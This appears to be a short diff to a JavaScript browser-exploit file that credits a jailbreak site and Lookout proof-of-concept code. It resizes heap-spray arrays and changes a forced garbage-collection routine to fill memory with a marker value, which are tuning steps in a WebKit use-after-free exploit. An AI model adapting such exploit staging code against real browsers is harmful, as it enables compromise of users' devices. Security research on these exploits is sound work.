@@ -1,6 +1,6 @@
 // Based on https://jbme.qwertyoruiop.com/
 // and lookout PoC code.
-var bufs = new Array(10000);
+var bufs = new Array(1000);
 var stale = 0;
 
 
@@ -56,13 +56,13 @@ function d2u(d) {
 }
 
 // dgc attempts to trigger a garbage collection by allocating a large amount of memory
-var pressure = new Array(150);
+var pressure = new Array(100);
 dgc = function() {
 	for(var i = 0; i < pressure.length; i++) {
 		pressure[i] = new Uint32Array(0x10000);
 	}
 	for(var i = 0; i < pressure.length; i++) {
-		pressure[i] = 0;
+		pressure[i] = 0x75757575;
 	}
 }
 
